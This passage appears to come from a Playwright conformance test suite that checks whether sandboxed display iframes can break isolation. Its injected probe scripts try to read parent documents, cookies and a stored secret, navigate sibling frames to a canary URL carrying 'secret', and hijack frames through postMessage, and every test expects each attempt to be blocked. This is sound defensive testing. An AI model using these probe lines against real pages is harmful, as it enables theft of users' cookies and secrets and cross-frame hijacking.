    async run(context) {
      const canary = await context.http();
      const display = await context.launch({
        config: inline(),
        content: attack(`
    const read = (name, run) => { try { r[name] = run(); } catch (e) { r[name] = "blocked"; } };
    read("origin", () => window.origin);
    read("parentDocument", () => typeof parent.document.title);
    read("topDocument", () => typeof top.document.title);
    read("parentLocation", () => String(parent.location.href));
    read("parentStorage", () => typeof parent.localStorage);
    read("parentGlobals", () => typeof parent.porthole);
    read("cookie", () => document.cookie);
    read("storage", () => localStorage.getItem("porthole-host-secret"));
    read("html", () => document.documentElement.outerHTML.includes(["porthole", "host", "secret", "value"].join("-")));
    read("opener", () => window.opener === null);`),
      });
      await context.page.evaluate(() => {
        document.cookie = "porthole_host=porthole-host-secret-value; path=/";
        localStorage.setItem("porthole-host-secret", "porthole-host-secret-value");
      });
      const verdict = await context.result(display);
      expect(verdict.origin).toBe("null");
      expect(verdict).toMatchObject({
        parentDocument: "blocked",
        topDocument: "blocked",
        parentLocation: "blocked",
        parentStorage: "blocked",
        storage: null,
        html: false,
        opener: true,
      });
      expect(["blocked", ""]).toContain(verdict.cookie);
      expect(canary.requests()).toEqual([]);
    },
  },
  {
    id: "9.siblings",
    item: 9,
    title: "a display can't navigate or drive another display",
    async run(context) {
      const canary = await context.http();
      const victim = await context.launch({
        config: inline(),
        content: '<p id="victim">victim</p>',
      });
      await expect((await victim.frame()).locator("#victim")).toHaveText("victim");
      const display = await context.launch({
        config: inline(),
        content: attack(`
    const frames = [];
    for (let index = 0; index < parent.length; index += 1) { if (parent[index] !== window) frames.push(parent[index]); }
    r.siblings = frames.length;
    for (const sibling of frames) {
      try { sibling.location = ${js(`${canary.origin}/sibling?d=secret`)}; r.navigated = true; } catch (e) { r.navigated = false; }
      sibling.postMessage({ jsonrpc: "2.0", method: "ui/notifications/tool-input", params: { arguments: { html: '<p id="hijacked">hijacked</p>' } } }, "*");
    }
    await wait(800);`),
      });
      const verdict = await context.result(display);
      await settle();
      expect(verdict.siblings, "the probe found its sibling").toBeGreaterThan(0);
      expect(canary.requests()).toEqual([]);
      const frame = await victim.frame();
      await expect(frame.locator("#victim")).toHaveText("victim");
      await expect(frame.locator("#hijacked")).toHaveCount(0);
    },
  },

  // ── 10: the embedding page's own origin ────────────────────────────────────────────────────
  {
    id: "10.self",
    item: 10,
    title: "nothing loads from the embedding page's own origin",
    async run(context) {
      const host = new URL(context.page.url()).origin;
      const display = await context.launch({
        config: inline(),
        content: attack(
          `
    const host = ${js(host)};
    await fetch(host + "/portholeProbe/fetch").catch(() => {});
    await import(host + "/portholeProbe/module.js").catch(() => {});
    await wait(800);`,
          `<img src="${host}/portholeProbe/img.png"><link rel="stylesheet" href="${host}/portholeProbe/style.css"><script src="${host}/portholeProbe/script.js"></script><style>@font-face { font-family: Self; src: url("${host}/portholeProbe/font.woff2"); } p { font-family: Self; }</style><p>self</p>`,
        ),
      });
      await context.result(display, 15_000);
      await settle();
      expect(context.requestsTo(host).filter((url) => url.includes("/portholeProbe/"))).toEqual([]);
    },
  },
  ...BEHAVIOR_PROBES,
  ...CLIPBOARD_PROBES,
];

type AnyTest = TestType<
  PlaywrightTestArgs & PlaywrightTestOptions,
  PlaywrightWorkerArgs & PlaywrightWorkerOptions
>;

/** The fixtures a conformance test uses. */
export interface ConformanceFixtures {
  readonly page: Page;
  readonly browserName: string;
}

/**
 * One conformance test, for a host's own spec file to register: its tests are then located in that
 * file, so `playwright test my-conformance.spec.ts` (or `--grep "\[1\.connect\]"`) finds them.
 *
 *   for (const each of leakTests(myHost)) {
 *     test(each.title, ({ page, browserName }, info) => each.run({ page, browserName }, info));
 *   }
 */
export interface ConformanceTest {
  readonly id: string;
  /** `[<id>] <what it proves>`: the probe id is greppable. */
  readonly title: string;
  run(fixtures: ConformanceFixtures, info: TestInfo): Promise<void>;
}

/** Every probe as a test entry (see `ConformanceTest`). */
export function leakTests(
  host: ConformanceHost,
  options: LeakSuiteOptions = {},
): ConformanceTest[] {
  return PROBES.map((probe) => ({
    id: probe.id,
    title: `[${probe.id}] ${probe.title}`,
    async run({ page, browserName }, info) {
      const reason = options.skip?.[probe.id];
      info.skip(reason !== undefined, reason);
      const closers: (() => Promise<void>)[] = [];
      const requests: string[] = [];
      page.on("response", (response) => requests.push(response.url()));
      try {
        await probe.run({
          page,
          engine: browserName,
          launch: (spec) => host.launch(page, spec),
          http: async (files) => {
            const oracle = await httpOracle(files);
            closers.push(() => oracle.close());
            return oracle;
          },
          udp: async () => {
            const oracle = await udpOracle();
            closers.push(() => oracle.close());
            return oracle;
          },
          result: async (display, timeoutMs = 10_000) => {
            await expect
              .poll(
                async () =>
                  (await display.frame())
                    .evaluate(() =>
                      Boolean(
                        (window as unknown as { portholeProbe?: { done?: boolean } }).portholeProbe
                          ?.done,
                      ),
                    )
                    .catch(() => false),
                { timeout: timeoutMs },
              )
              .toBe(true);
            return (await display.frame()).evaluate(
              () => (window as unknown as { portholeProbe: Record<string, unknown> }).portholeProbe,
            );
          },
          requestsTo: (origin) =>
            requests.filter((url) => url.startsWith(`${origin}/`) || url === origin),
          measured: (text) => info.annotations.push({ type: "measured", description: text }),
        });
      } finally {
        await Promise.all(closers.map((close) => close()));
      }
    },
  }));
}

/**
 * Registers every probe as a test. Its tests are located in Porthole's own files; a host that
 * wants to select them by its spec file registers `leakTests` itself instead.
 */
export function defineLeakSuite(
  test: AnyTest,
  host: ConformanceHost,
  options: LeakSuiteOptions = {},
): void {
  test.describe(`Porthole leak suite (${host.name})`, () => {
    for (const each of leakTests(host, options)) {
      test(each.title, ({ page, browserName }, info) => each.run({ page, browserName }, info));
    }
  });
}
